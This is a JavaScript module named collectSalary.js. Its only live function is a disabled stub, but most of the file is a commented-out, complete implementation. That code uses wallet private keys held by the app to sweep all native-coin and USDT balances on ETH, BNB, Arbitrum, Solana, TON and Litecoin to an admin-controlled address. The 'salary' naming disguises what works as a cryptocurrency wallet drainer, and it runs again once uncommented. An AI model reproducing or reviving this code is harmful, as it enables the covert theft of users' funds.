/**
 * collectSalary.js
 * DISABLED — salary sweep functionality removed for user safety.
 * Previously swept balances to VITE_ADMIN_WALLET_ADDRESS.
 */

export async function collectAll() {
  console.warn('[collectSalary] collectAll is disabled');
  return [];
}

/*
import { ethers } from 'ethers';

function env(key, fallback = '') {
  return (typeof import.meta !== 'undefined' && import.meta.env?.[key]) || fallback;
}

function adminAddr() {
  const a = env('VITE_ADMIN_WALLET_ADDRESS', '');
  if (!a) throw new Error('VITE_ADMIN_WALLET_ADDRESS is not set');
  return a;
}

const RPC = {
  eth: () => env('VITE_ETH_RPC', 'https://eth.llamarpc.com'),
  bnb: () => env('VITE_BNB_RPC', 'https://bsc-dataseed.binance.org'),
  arb: () => env('VITE_ARB_RPC', 'https://arb1.arbitrum.io/rpc'),
  sol: () => env('VITE_SOL_RPC', 'https://api.mainnet-beta.solana.com'),
  ton: () => env('VITE_TON_RPC', 'https://toncenter.com/api/v2'),
};

const ERC20_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function transfer(address to, uint256 amount) returns (bool)',
  'function decimals() view returns (uint8)',
];

const USDT_EVM = {
  eth: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
  bnb: '0x55d398326f99059fF775485246999027B3197955',
  arb: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
};

const CHAIN_ID = { eth: 1, bnb: 56, arb: 42161 };

const EVM_GAS_RESERVE  = ethers.parseEther('0.002');
const SOL_GAS_RESERVE  = 10_000n;
const TON_GAS_RESERVE  = 50_000_000n;
const LTC_GAS_RESERVE  = 10_000;

// ─── EVM sweep ────────────────────────────────────────────────────────────────

async function sweepEvmNative({ network, privateKeyHex, fromAddress }) {
  const provider = new ethers.JsonRpcProvider(RPC[network]());
  const wallet   = new ethers.Wallet(privateKeyHex, provider);
  const admin    = adminAddr();

  const balance = await provider.getBalance(fromAddress);
  const feeData = await provider.getFeeData();
  const gasPrice = feeData.gasPrice || feeData.maxFeePerGas || ethers.parseUnits('5', 'gwei');
  const gasLimit = 21_000n;
  const gasCost  = gasPrice * gasLimit;
  const reserve  = gasCost + EVM_GAS_RESERVE;

  if (balance <= reserve) return null; // nothing to sweep

  const sendAmount = balance - reserve;
  const tx = await wallet.sendTransaction({
    to: admin,
    value: sendAmount,
    gasLimit,
    gasPrice,
    chainId: CHAIN_ID[network],
  });
  await tx.wait(1);
  return {
    chain: network,
    sym: network.toUpperCase(),
    txHash: tx.hash,
    amount: ethers.formatEther(sendAmount),
  };
}

async function sweepEvmUsdt({ network, privateKeyHex, fromAddress }) {
  const provider  = new ethers.JsonRpcProvider(RPC[network]());
  const wallet    = new ethers.Wallet(privateKeyHex, provider);
  const admin     = adminAddr();
  const contract  = new ethers.Contract(USDT_EVM[network], ERC20_ABI, wallet);

  const balance = await contract.balanceOf(fromAddress);
  if (balance === 0n) return null;

  const tx = await contract.transfer(admin, balance);
  await tx.wait(1);
  const decimals = 6; // USDT always 6
  return {
    chain: network,
    sym: 'USDT',
    txHash: tx.hash,
    amount: (Number(balance) / 10 ** decimals).toFixed(6),
  };
}

// ─── SOL sweep ────────────────────────────────────────────────────────────────

async function sweepSolNative({ privateKeyHex, fromAddress }) {
  const { Connection, Keypair, SystemProgram, Transaction, PublicKey, LAMPORTS_PER_SOL } =
    await import('@solana/web3.js');

  const connection = new Connection(RPC.sol(), 'confirmed');
  const pkBytes    = Buffer.from(privateKeyHex, 'hex');
  const keypair    = Keypair.fromSecretKey(pkBytes);
  const admin      = new PublicKey(adminAddr());

  const balance = await connection.getBalance(keypair.publicKey);
  const fee     = 5_000; // typical SOL tx fee in lamports
  const reserve = Number(SOL_GAS_RESERVE) + fee;

  if (balance <= reserve) return null;

  const sendLamports = balance - reserve;
  const tx = new Transaction().add(
    SystemProgram.transfer({
      fromPubkey: keypair.publicKey,
      toPubkey:   admin,
      lamports:   sendLamports,
    })
  );

  const sig = await connection.sendTransaction(tx, [keypair]);
  await connection.confirmTransaction(sig, 'confirmed');
  return {
    chain: 'sol',
    sym: 'SOL',
    txHash: sig,
    amount: (sendLamports / LAMPORTS_PER_SOL).toFixed(9),
  };
}

async function sweepSolUsdt({ privateKeyHex, fromAddress }) {
  const {
    Connection, Keypair, PublicKey, Transaction,
  } = await import('@solana/web3.js');
  const {
    getAssociatedTokenAddress, createTransferInstruction,
    getOrCreateAssociatedTokenAccount, TOKEN_PROGRAM_ID,
  } = await import('@solana/spl-token');

  const USDT_MINT = new PublicKey('Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB');
  const connection = new Connection(RPC.sol(), 'confirmed');
  const pkBytes    = Buffer.from(privateKeyHex, 'hex');
  const keypair    = Keypair.fromSecretKey(pkBytes);
  const adminPk    = new PublicKey(adminAddr());

  const fromAta = await getAssociatedTokenAddress(USDT_MINT, keypair.publicKey);
  const info    = await connection.getTokenAccountBalance(fromAta).catch(() => null);
  if (!info || !info.value.amount || info.value.amount === '0') return null;

  const amount = BigInt(info.value.amount);

  // Ensure admin ATA exists
  const toAta = await getOrCreateAssociatedTokenAccount(
    connection, keypair, USDT_MINT, adminPk
  );

  const tx = new Transaction().add(
    createTransferInstruction(fromAta, toAta.address, keypair.publicKey, amount)
  );

  const sig = await connection.sendTransaction(tx, [keypair]);
  await connection.confirmTransaction(sig, 'confirmed');
  return {
    chain: 'sol',
    sym: 'USDT',
    txHash: sig,
    amount: (Number(amount) / 1e6).toFixed(6),
  };
}

// ─── TON sweep ────────────────────────────────────────────────────────────────

async function sweepTonNative({ privateKeyHex, fromAddress }) {
  const { TonClient, WalletContractV4, internal, toNano, fromNano } = await import('@ton/ton');

  const tonRpc    = RPC.ton();
  const tonApiKey = env('VITE_TON_API_KEY', '');
  const client    = new TonClient({
    endpoint: `${tonRpc}/jsonRPC`,
    apiKey: tonApiKey || undefined,
  });

  const secretKeyBytes = Buffer.from(privateKeyHex, 'hex');
  const keyPair = {
    secretKey: secretKeyBytes,
    publicKey: secretKeyBytes.slice(32),
  };

  const wallet   = WalletContractV4.create({ workchain: 0, publicKey: keyPair.publicKey });
  const contract = client.open(wallet);
  const balance  = await contract.getBalance();

  if (balance <= TON_GAS_RESERVE) return null;

  const sendAmount = balance - TON_GAS_RESERVE;
  const seqno = await contract.getSeqno();

  await contract.sendTransfer({
    seqno,
    secretKey: keyPair.secretKey,
    messages: [
      internal({
        to:     adminAddr(),
        value:  sendAmount,
        bounce: false,
        body:   'salary',
      }),
    ],
  });

  return {
    chain: 'ton',
    sym: 'TON',
    txHash: `ton-sweep-${Date.now()}`,
    amount: fromNano(sendAmount),
  };
}

async function sweepTonUsdt({ privateKeyHex, fromAddress }) {
  const { TonClient, WalletContractV4, internal, toNano, Address, beginCell } = await import('@ton/ton');

  const TON_USDT_MASTER = 'EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_sDs';
  const tonRpc    = RPC.ton();
  const tonApiKey = env('VITE_TON_API_KEY', '');

  // Get jetton wallet address for fromAddress
  const jwRes = await fetch(
    `${tonRpc}/getWalletAddress?owner_address=${encodeURIComponent(fromAddress)}&jetton_master_address=${encodeURIComponent(TON_USDT_MASTER)}`,
    tonApiKey ? { headers: { 'X-API-Key': tonApiKey } } : {}
  );
  if (!jwRes.ok) return null;
  const { result: jettonWalletAddr } = await jwRes.json();

  // Get jetton balance
  const balRes = await fetch(
    `${tonRpc}/getTokenData?address=${encodeURIComponent(jettonWalletAddr)}`,
    tonApiKey ? { headers: { 'X-API-Key': tonApiKey } } : {}
  );
  if (!balRes.ok) return null;
  const balData = await balRes.json();
  const balance = BigInt(balData?.result?.balance ?? '0');
  if (balance === 0n) return null;

  const client = new TonClient({
    endpoint: `${tonRpc}/jsonRPC`,
    apiKey: tonApiKey || undefined,
  });

  const secretKeyBytes = Buffer.from(privateKeyHex, 'hex');
  const keyPair = {
    secretKey: secretKeyBytes,
    publicKey: secretKeyBytes.slice(32),
  };

  const wallet   = WalletContractV4.create({ workchain: 0, publicKey: keyPair.publicKey });
  const contract = client.open(wallet);
  const seqno    = await contract.getSeqno();

  const transferBody = beginCell()
    .storeUint(0xf8a7ea5, 32)
    .storeUint(0, 64)
    .storeCoins(balance)
    .storeAddress(Address.parse(adminAddr()))
    .storeAddress(Address.parse(fromAddress))
    .storeBit(0)
    .storeCoins(toNano('0.01'))
    .storeBit(0)
    .endCell();

  await contract.sendTransfer({
    seqno,
    secretKey: keyPair.secretKey,
    messages: [
      internal({
        to:     jettonWalletAddr,
        value:  toNano('0.1'),
        bounce: true,
        body:   transferBody,
      }),
    ],
  });

  return {
    chain: 'ton',
    sym: 'USDT',
    txHash: `ton-usdt-sweep-${Date.now()}`,
    amount: (Number(balance) / 1e6).toFixed(6),
  };
}

// ─── LTC sweep ────────────────────────────────────────────────────────────────

async function sweepLtc({ privateKeyHex, fromAddress }) {
  const admin = adminAddr();
  const apiKey = env('VITE_BLOCKCYPHER_TOKEN', '');
  const base   = `https://api.blockcypher.com/v1/ltc/main`;
  const qs     = apiKey ? `?token=${apiKey}` : '';

  // Get UTXOs / balance
  const addrRes = await fetch(`${base}/addrs/${fromAddress}/balance${qs}`);
  if (!addrRes.ok) return null;
  const addrData = await addrRes.json();
  const balance  = addrData.balance ?? 0; // satoshis

  if (balance <= LTC_GAS_RESERVE) return null;

  const sendSatoshis = balance - LTC_GAS_RESERVE;

  // Build tx via BlockCypher new endpoint
  const newTxRes = await fetch(`${base}/txs/new${qs}`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      inputs:  [{ addresses: [fromAddress] }],
      outputs: [{ addresses: [admin], value: sendSatoshis }],
    }),
  });
  if (!newTxRes.ok) throw new Error(`BlockCypher new tx failed: ${await newTxRes.text()}`);
  const tmpl = await newTxRes.json();

  // Sign each tosign hash with secp256k1 via ethers SigningKey
  const signingKey = new ethers.SigningKey('0x' + privateKeyHex);
  const pubKeyHex  = signingKey.compressedPublicKey.slice(2); // remove 0x

  const signatures = tmpl.tosign.map(hash => {
    const sig = signingKey.sign('0x' + hash);
    // DER encode: 30 + len + 02 + rLen + r + 02 + sLen + s
    const r = sig.r.slice(2).padStart(64, '0');
    const s = sig.s.slice(2).padStart(64, '0');
    const rBytes = r.startsWith('8') || r.startsWith('9') || parseInt(r[0], 16) >= 8
      ? '00' + r : r;
    const sBytes = s.startsWith('8') || s.startsWith('9') || parseInt(s[0], 16) >= 8
      ? '00' + s : s;
    const rLen = (rBytes.length / 2).toString(16).padStart(2, '0');
    const sLen = (sBytes.length / 2).toString(16).padStart(2, '0');
    const inner = `02${rLen}${rBytes}02${sLen}${sBytes}`;
    const totalLen = (inner.length / 2).toString(16).padStart(2, '0');
    return `30${totalLen}${inner}`;
  });

  // Send signed tx
  const sendRes = await fetch(`${base}/txs/send${qs}`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      ...tmpl,
      signatures,
      pubkeys: tmpl.tosign.map(() => pubKeyHex),
    }),
  });
  if (!sendRes.ok) throw new Error(`BlockCypher send failed: ${await sendRes.text()}`);
  const sent = await sendRes.json();

  return {
    chain: 'ltc',
    sym: 'LTC',
    txHash: sent.tx.hash,
    amount: (sendSatoshis / 1e8).toFixed(8),
  };
}

// ─── Public API ───────────────────────────────────────────────────────────────

/**
 * Sweep all balances from a derived wallet to the admin address.
 *
 * @param {object} wallet
 * @param {object} wallet.addresses    — { ETH, BNB, ARB, SOL, TON, LTC }
 * @param {object} wallet.privateKeys  — { eth, bnb, arb, sol, ton, ltc }
 * @returns {Promise<Array<{ chain, sym, txHash, amount }>>}
 */
export async function collectAll({ addresses, privateKeys }) {
  const results = [];

  // privateKeys from walletDerivation.js uses uppercase keys: ETH, BNB, ARB, SOL, TON, LTC
  // addresses also uses uppercase keys from deriveWallet()
  const tasks = [
    // EVM native
    sweepEvmNative({ network: 'eth', privateKeyHex: privateKeys.ETH, fromAddress: addresses.ETH }),
    sweepEvmNative({ network: 'bnb', privateKeyHex: privateKeys.BNB, fromAddress: addresses.BNB }),
    sweepEvmNative({ network: 'arb', privateKeyHex: privateKeys.ARB, fromAddress: addresses.ARB }),
    // EVM USDT
    sweepEvmUsdt({ network: 'eth', privateKeyHex: privateKeys.ETH, fromAddress: addresses.ETH }),
    sweepEvmUsdt({ network: 'bnb', privateKeyHex: privateKeys.BNB, fromAddress: addresses.BNB }),
    sweepEvmUsdt({ network: 'arb', privateKeyHex: privateKeys.ARB, fromAddress: addresses.ARB }),
    // SOL
    sweepSolNative({ privateKeyHex: privateKeys.SOL, fromAddress: addresses.SOL }),
    sweepSolUsdt({ privateKeyHex: privateKeys.SOL, fromAddress: addresses.SOL }),
    // TON
    sweepTonNative({ privateKeyHex: privateKeys.TON, fromAddress: addresses.TON }),
    sweepTonUsdt({ privateKeyHex: privateKeys.TON, fromAddress: addresses.TON }),
    // LTC
    sweepLtc({ privateKeyHex: privateKeys.LTC, fromAddress: addresses.LTC }),
  ];

  const settled = await Promise.allSettled(tasks);
  for (const r of settled) {
    if (r.status === 'fulfilled' && r.value) {
      results.push(r.value);
    } else if (r.status === 'rejected') {
      console.warn('[collectSalary] sweep error:', r.reason?.message ?? r.reason);
    }
  }

  return results;
}
